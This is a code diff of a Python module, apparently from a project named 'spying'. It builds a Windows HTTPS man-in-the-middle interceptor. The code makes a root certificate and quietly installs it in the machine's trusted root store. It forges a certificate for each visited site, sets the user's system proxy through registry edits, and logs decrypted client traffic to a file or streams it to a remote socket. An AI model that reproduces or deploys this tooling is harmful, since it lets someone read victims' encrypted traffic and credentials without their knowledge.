@@ -1,16 +1,22 @@
 from __future__ import annotations
-import os
-# import warnings
 
+from functools import lru_cache
+import logging
+import os
+import warnings
+from pathlib import Path
+import OpenSSL
 
 # os.environ['PYTHONASYNCIODEBUG'] = '1'
 # logging.basicConfig(level=logging.DEBUG)
 # warnings.resetwarnings()
 
+import subprocess
+
 from spying.consts import *
 import random
 import ssl
-from typing import Tuple, Optional, TextIO
+from typing import Tuple, Optional, TextIO, Union
 from mitm import MITM, middleware, Connection, protocol, __data__
 # from network import send
 from socket import socket
@@ -32,38 +38,38 @@ ca_cert: cry.X509 | None = None
 ca_key: cry.PKey | None = None
 
 
-async def create_root_using_python(ca_path: str, country: str | None = "Is", state: str | None = PROJECT_NAME,
+def create_root_using_python(ca_path: str, country: str | None = "Is", state: str | None = PROJECT_NAME,
                                    organiztion: str | None = PROJECT_NAME, common_name: str = PROJECT_NAME):
     global ca_cert
     global ca_key
-    ca_key = cry.PKey()
-    ca_key.generate_key(cry.TYPE_RSA, 2048)
 
-    ca_cert = cry.X509()
+    ca_key = OpenSSL.crypto.PKey()
+    ca_key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
+
+    ca_cert = OpenSSL.crypto.X509()
+    ca_cert.get_subject().C = country
+    ca_cert.get_subject().ST = state
+    ca_cert.get_subject().L = state
+    ca_cert.get_subject().O = organiztion
+    ca_cert.get_subject().OU = organiztion
+    ca_cert.get_subject().CN = common_name
+    ca_cert.set_serial_number(random.randint(0, 2 ** 64 - 1))
     ca_cert.set_version(2)
-    ca_cert.set_serial_number(random.randint(50000000, 100000000))
-
-    ca_subj = ca_cert.get_subject()
-    ca_subj.commonName = common_name
-    if country:
-        ca_subj.C = country
-    if state:
-        ca_subj.ST = state
-    if organiztion:
-        ca_subj.OU = organiztion
-
-    # ca_cert.add_extensions([
-    #     cry.X509Extension(b"subjectKeyIdentifier", False, b"hash", subject=ca_cert),
-    #     cry.X509Extension(b"authorityKeyIdentifier", False, b"keyid:always", issuer=ca_cert),
-    #     cry.X509Extension(b"basicConstraints", False, b"CA:TRUE"),
-    #     cry.X509Extension(b"keyUsage", False, b"keyCertSign, cRLSign"),
-    # ])
-
-    ca_cert.set_issuer(ca_subj)
-    ca_cert.set_pubkey(ca_key)
     ca_cert.gmtime_adj_notBefore(0)
     ca_cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
-    ca_cert.sign(ca_key, 'sha256')
+    ca_cert.set_issuer(ca_cert.get_subject())
+
+    # Creates CA.
+    ca_cert.set_pubkey(ca_key)
+    ca_cert.add_extensions(
+        [
+            OpenSSL.crypto.X509Extension(b"basicConstraints", True, b"CA:TRUE, pathlen:0"),
+            OpenSSL.crypto.X509Extension(b"keyUsage", True, b"keyCertSign, cRLSign"),
+            OpenSSL.crypto.X509Extension(b"subjectKeyIdentifier", False, b"hash", subject=ca_cert),
+        ],
+    )
+    ca_cert.sign(ca_key, "sha256")
+
 
     # Save certificate
     with open(f"{ca_path}.crt", "wb") as f:
@@ -76,72 +82,87 @@ async def create_root_using_python(ca_path: str, country: str | None = "Is", sta
     os.system(f"certutil -addstore root {ca_path}.crt")
 
 
-async def new_pair_using_python(host: str, country: str = "Is", state: str = PROJECT_NAME,
-                                organiztion: str = PROJECT_NAME):
+@lru_cache(maxsize=1024)
+def new_context_using_python(host: str):
+    # Generates cert/key for the host.
+    # Generate a new key pair.
+    key = OpenSSL.crypto.PKey()
+    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
+
+
+    # Generates new X509Request.
+    req = OpenSSL.crypto.X509Req()
+    req.get_subject().CN = host.encode("utf-8")
+    req.set_pubkey(key)
+    req.sign(key, "sha256")
+
+    # Generates new X509 certificate.
+    cert = OpenSSL.crypto.X509()
+    cert.set_serial_number(random.randint(0, 2 ** 64 - 1))
+    cert.set_version(2)
+    cert.gmtime_adj_notBefore(0)
+    cert.gmtime_adj_notAfter(1 * (365 * 24 * 60 * 60))
+    cert.set_subject(ca_cert.get_subject())
+    cert.get_subject().CN = host
+    cert.set_issuer(ca_cert.get_subject())
+    cert.set_pubkey(req.get_pubkey())
+
+    # Sets the certificate 'subjectAltName' extension.
+    hosts = [f"DNS:{host}"]
+
+    # if False:
+    #     hosts += [f"IP:{host}"]
+    # else:
+    hosts += [f"DNS:*.{host}"]
+
+    hosts = ", ".join(hosts).encode("utf-8")
+    cert.add_extensions([OpenSSL.crypto.X509Extension(b"subjectAltName", False, hosts)])
+
+    # Signs the certificate with the CA's key.
+    cert.sign(ca_key, "sha256")
+
+
+    # Dump the cert and key.
+    cert_dump = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
+    key_dump = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key)
+
+
     host_path = f"{CERT_FOLDER}\\{host}"
-    client_key = cry.PKey()
-    client_key.generate_key(cry.TYPE_RSA, 2048)
+    cert_path, key_path = Path(f"{host_path}.crt"), Path(f"{host_path}.key")
+    cert_path.parent.mkdir(parents=True, exist_ok=True)
+    with cert_path.open("wb") as f:
+        f.write(cert_dump)
+    key_path.parent.mkdir(parents=True, exist_ok=True)
+    with key_path.open("wb") as f:
+        f.write(key_dump)
 
-    client_cert = cry.X509()
-    client_cert.set_version(2)
-    client_cert.set_serial_number(random.randint(50000000, 100000000))
+    # Creates new SSLContext.
+    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+    context.load_cert_chain(certfile=cert_path, keyfile=key_path)
 
-    client_subj = client_cert.get_subject()
-    client_subj.commonName = host
-    if country:
-        client_subj.C = country
-    if state:
-        client_subj.ST = state
-    if organiztion:
-        client_subj.OU = organiztion
+    # Remove the temporary files.
+    cert_path.unlink()
+    key_path.unlink()
 
-    san_list = [f"DNS:{host}"]
-    client_cert.add_extensions([
-        cry.X509Extension(
-            b"keyUsage", False,
-            b"Digital Signature, Non Repudiation, Key Encipherment"),
-        cry.X509Extension(
-            b"basicConstraints", False, b"CA:FALSE"),
-        cry.X509Extension(
-            b'extendedKeyUsage', False, b'serverAuth, clientAuth'),
-        cry.X509Extension(
-            b"subjectAltName", False, ", ".join(san_list).encode())
-    ])
+    return context
 
-    # client_cert.add_extensions([
-    #     cry.X509Extension("basicConstraints", False, "CA:FALSE"),
-    #     cry.X509Extension("subjectKeyIdentifier", False, "hash", subject=client_cert),
-    # ])
-    #
-    # client_cert.add_extensions([
-    #     cry.X509Extension("authorityKeyIdentifier", False, "keyid:always", issuer=ca_cert),
-    #     cry.X509Extension("extendedKeyUsage", False, "clientAuth"),
-    #     cry.X509Extension("keyUsage", False, "digitalSignature"),
-    # ])
-    ca_subj = ca_cert.get_subject()
-    client_cert.set_issuer(ca_subj)
-    client_cert.set_pubkey(client_key)
-    client_cert.gmtime_adj_notBefore(0)
-    client_cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
-
-    client_cert.sign(ca_key, 'sha256')
-
-    # Save certificate
-    with open(f"{host_path}.crt", "wb") as f:
-        f.write(cry.dump_certificate(cry.FILETYPE_PEM, client_cert))
-
-    # Save private key
-    with open(f"{host_path}.key", "wb") as f:
-        f.write(cry.dump_privatekey(cry.FILETYPE_PEM, client_key))
 
 
 async def create_root(ca_path: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME,
                       common_name=PROJECT_NAME):
+    """
+    creates the root certificate and install it to the OP
+    """
     pathlib.Path(ca_path).parent.mkdir(parents=True, exist_ok=True)
-    os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
-    os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
-              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
-    os.system(f'certutil -addstore root "{ca_path}.crt"')
+    # os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
+    # os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
+    #           f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
+    # os.system(f'certutil -addstore root "{ca_path}.crt"')
+    subprocess.run([OPENSSL_PATH, "genrsa", "-out", f"{ca_path}.key", "4096"])
+    subprocess.run(
+        [OPENSSL_PATH, "req", "-x509", "-new", "-nodes", "-key", f"{ca_path}.key", "-sha256", "-days", "1024",
+         '-subj', f"/C={country}/ST={state}/O={organiztion}/CN={common_name}", "-out", f"{ca_path}.crt"])
+    subprocess.run(['certutil', "-addstore", "root", f"{ca_path}.crt"])
 
 
 async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME):
@@ -164,34 +185,41 @@ async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, o
                 f"subjectAltName = @alt_names\n"
                 f"[alt_names]\n"
                 f"DNS.1 = {host}")
-    os.system(f'openssl genrsa -out "{host_path}.key" 2048')
-    os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
-              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
-              f'-config "{host_path}.conf" '
-              f'-out "{host_path}.csr"')
+
+    # os.system(f'openssl genrsa -out "{host_path}.key" 2048')
+    # os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
+    #           f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
+    #           f'-config "{host_path}.conf" '
+    #           f'-out "{host_path}.csr"')
+    subprocess.run([OPENSSL_PATH, "genrsa", "-out", f"{host_path}.key", "2048"])
+    subprocess.run([OPENSSL_PATH, "req", "-new", "-sha256", "-key", f"{host_path}.key",
+                    "-subj", f"/C={country}/ST={state}/O={organiztion}/CN={host}",
+                    '-config', f"{host_path}.conf",
+                    '-out', f"{host_path}.csr"])
+
     # os.system(f'openssl req -out "{host_path}.csr" -newkey rsa:2048 -nodes -keyout "{host_path}.key" -config "{host_path}.conf"')
     # os.system(f'openssl req -noout -text -in "{host_path}.csr"')
     # os.system(f"openssl req -in {host}.csr -noout -text")
-    os.system(f'openssl x509 -req -in "{host_path}.csr" '
-              f'-CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256 '
-              f'-extfile "{host_path}.conf" '
-              f'-extensions req_ext'
-              )
+
+
+    # os.system(f'openssl x509 -req -in "{host_path}.csr" '
+    #           f'-CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256 '
+    #           f'-extfile "{host_path}.conf" '
+    #           f'-extensions req_ext'
+    #           )
+    subprocess.run([OPENSSL_PATH, "x509", "-req", "-in", f"{host_path}.csr",
+                    '-CA', f"{ca_path}.crt", "-CAkey", f"{ca_path}.key", "-CAcreateserial", "-out", f"{host_path}.crt",
+                    "-days", "500", "-sha256",
+                    '-extfile', f"{host_path}.conf",
+                    '-extensions', "req_ext"
+                    ])
+    a=5
+
     # os.system(f"openssl x509 -in {host_path}.crt -text -noout")
 
 
 async def create_crypto2(host: str):
-    a = await new_pair2(host)
-    # print(a)
-    # context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-    # context.load_verify_locations(f"{CERT_FOLDER}\\{ROOT_CA_NAME}.crt")
-    # context.load_cert_chain(certfile=f"{CERT_FOLDER}\\{host}.crt", keyfile=f"{CERT_FOLDER}\\{host}.key")
-    install_cert(f"{CERT_FOLDER}\\{host}.crt")
-    # os.remove(rsa_key)
-    # os.remove(rsa_cert)
-
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain(certfile=f"{CERT_FOLDER}\\{host}.crt", keyfile=f"{CERT_FOLDER}\\{host}.key")
+    context = new_context_using_python(host)
     installed_hosts[host] = context
 
 
@@ -210,11 +238,16 @@ async def start_connection(connection: Connection, data):
 
 
 class HttpsLogger(middleware.Middleware):
+    """
+    abstract class for saving the info of the MITM and verify the certificates
+    """
     @classmethod
     async def mitm_started(cls, host: str, port: int):
         await cls.write(f"MITM started on {host}:{port}.\n")
         # print("MITM started on %s:%d.\n" % (host, port))
-        await create_root(f"{CERT_FOLDER}\\{ROOT_CA_NAME}")
+        ca_path = f"{CERT_FOLDER}\\{ROOT_CA_NAME}"
+        create_root_using_python(ca_path)
+        # await create_root(f"{CERT_FOLDER}\\{ROOT_CA_NAME}")
 
     @classmethod
     async def client_connected(cls, connection: Connection):
@@ -226,13 +259,25 @@ class HttpsLogger(middleware.Middleware):
     async def server_connected(cls, connection: Connection):
         host, port = connection.server.writer._transport.get_extra_info("peername")
         await cls.write(f"Connected to server {host}:{port}.\n")
+
         # print("Connected to server %s:%i.\n" % (host, port))
 
     @classmethod
     async def client_data(cls, connection: Connection, data: bytes) -> bytes:
         await cls.write(f"Client to server: \n\n\t{data}\n")
         # print("Client to server: \n\n\t%s\n" % data)
-        await start_connection(connection, data)
+        # # print("what")
+        if b"CONNECT" in data:
+            # print("whatttt")
+            host = str(data[data.find(b" ") + 1: data.find(b":")])[2:-1]
+            # print("OK")
+            # # print("Wow")
+            if host not in installed_hosts:
+                await create_crypto2(host)
+            connection.ssl_context = installed_hosts[host]
+        else:
+            if connection.ssl_context not in installed_hosts.values():
+                print("What?!")
         return data
 
     @classmethod
@@ -259,16 +304,24 @@ class HttpsLogger(middleware.Middleware):
 class FileLog(HttpsLogger):
     @staticmethod
     async def write(info: str):
+        print(info)
         file.write(info)
 
 
 class NetLog(HttpsLogger):
     @staticmethod
     async def write(info: str):
-        send(info, my_socket)
+        try:
+            send(info, my_socket)
+        except Exception:
+            exit(0)
 
 
 def set_reg(name, value, size):
+    """
+    update value in the registry.
+    return whether succeeded or not
+    """
     try:
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                       "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
@@ -285,10 +338,13 @@ def install_cert(host: str | None = None):
     if not host:
         return
     path = __data__.joinpath(f"mitm.crt") if not host else host
-    os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")
+    os.system(fr"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")
 
 
 def __filestart(path: str, address: Tuple[str, int]) -> bool:
+    """
+    starts MITM and save to file
+    """
     global file
     try:
         if file or my_socket:
@@ -302,6 +358,9 @@ def __filestart(path: str, address: Tuple[str, int]) -> bool:
 
 
 def __netstart(address) -> bool:
+    """
+    starts MITM and send on net
+    """
     global my_socket
     try:
         if file or my_socket:
@@ -315,6 +374,9 @@ def __netstart(address) -> bool:
 
 
 def __start(address) -> bool:
+    """
+    starts the MITM
+    """
     global mitm
     if my_socket and file:
         return False
@@ -328,6 +390,7 @@ def __start(address) -> bool:
 
     # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
     # sys.stdout.write("yes")
+    # set the proxy:
     if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
         return False
     # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
@@ -351,3 +414,5 @@ def __start(address) -> bool:
     return True
 
 
+if __name__ == "__main__":
+    __filestart("logger.txt", ("127.0.0.1", 4))
